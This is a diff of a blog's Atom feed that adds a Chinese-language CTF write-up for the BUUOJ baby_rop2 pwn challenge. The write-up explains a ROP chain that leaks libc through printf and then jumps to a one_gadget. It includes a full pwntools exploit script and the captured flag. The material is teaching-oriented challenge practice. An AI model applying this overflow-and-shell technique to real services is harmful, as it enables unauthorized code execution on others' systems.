@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://helianthus.top/"/>
-  <updated>2020-06-04T07:55:20.258Z</updated>
+  <updated>2020-06-20T07:30:38.172Z</updated>
   <id>https://helianthus.top/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【CTF-PWN】ROP + One_gadget拿shell</title>
+    <link href="https://helianthus.top/2020/06/20/18-buuoj-babyrop2/"/>
+    <id>https://helianthus.top/2020/06/20/18-buuoj-babyrop2/</id>
+    <published>2020-06-20T14:59:27.000Z</published>
+    <updated>2020-06-20T07:30:38.172Z</updated>
+    
+    <content type="html"><![CDATA[<p>记录一下在题目中one_gadget的使用, one_gadget永远滴神.</p><a id="more"></a><h2 id="0x01-题目地址"><a href="#0x01-题目地址" class="headerlink" title="0x01 题目地址"></a>0x01 题目地址</h2><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p><h2 id="0x02-开始梭哈"><a href="#0x02-开始梭哈" class="headerlink" title="0x02 开始梭哈"></a>0x02 开始梭哈</h2><p>题目给了一个<code>babyrop2</code>和一个<code>libc.so.6</code>, 先分析一下这个<code>babyrop2</code>.</p><h5 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h5><p>程序就一个输入点<br><img src="/images/18/1.jpg" alt></p><p>打算使用<code>printf</code>函数泄露出<code>__libc_start_main</code>的地址. (确实没有找到合适泄露的函数, 只能这个了…)<br><img src="/images/18/2.jpg" alt></p><p>也就是要构造一个<code>printf(&quot;%s&quot;, __libc_start_main的got地址)</code><br>先找到<code>%s</code><br><img src="/images/18/3.jpg" alt></p><p>截取到<code>%s</code>开始, 也就是<br><img src="/images/18/4.jpg" alt></p><p><code>__libc_start_main</code>的<code>got</code>就不用多说了.</p><p>接下来从<code>libc.so.6</code>里面得到一些信息</p><h5 id="libc-so-6"><a href="#libc-so-6" class="headerlink" title="libc.so.6"></a>libc.so.6</h5><p>我们要从这个文件中得到<code>one_gadget</code>, 需要借助一个工具, 就叫<code>one_gadget</code>.<br><img src="/images/18/5.jpg" alt></p><p><code>one_gadget</code>是什么呢? 就是我们以往做<code>ROP</code>需要泄露地址然后拿到真实的<code>system</code>函数以及<code>bin_sh</code>字符串的地址构造<code>ROP</code>, 但是当有了<code>one_gadget</code>, 就可以直接返回到这个地址拿到<code>shell</code>.</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote("node3.buuoj.cn", 29305)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babyrop2"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>format_string <span class="token operator">=</span> <span class="token number">0x400790</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400733</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400731</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>format_string<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"libc_start_main: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x45216</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/18/6.jpg" alt></p><p>emm, 这题目<code>flag</code>竟然没放到根目录, 还要找一下才可以QAQ</p><p><code>flag{23d424ad-f38b-4a47-a60f-41ca5c19fb88}</code></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;记录一下在题目中one_gadget的使用, one_gadget永远滴神.&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
+    
+    
+      <category term="pwn" scheme="https://helianthus.top/tags/pwn/"/>
+    
+      <category term="rop" scheme="https://helianthus.top/tags/rop/"/>
+    
+  </entry>
   
   <entry>
     <title>BUUOJ CTF Misc题目WriteUP</title>
@@ -176,11 +201,11 @@
       <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
     
     
-      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
-    
       <category term="Android" scheme="https://helianthus.top/tags/Android/"/>
     
       <category term="Reverse" scheme="https://helianthus.top/tags/Reverse/"/>
+    
+      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
     
   </entry>
   
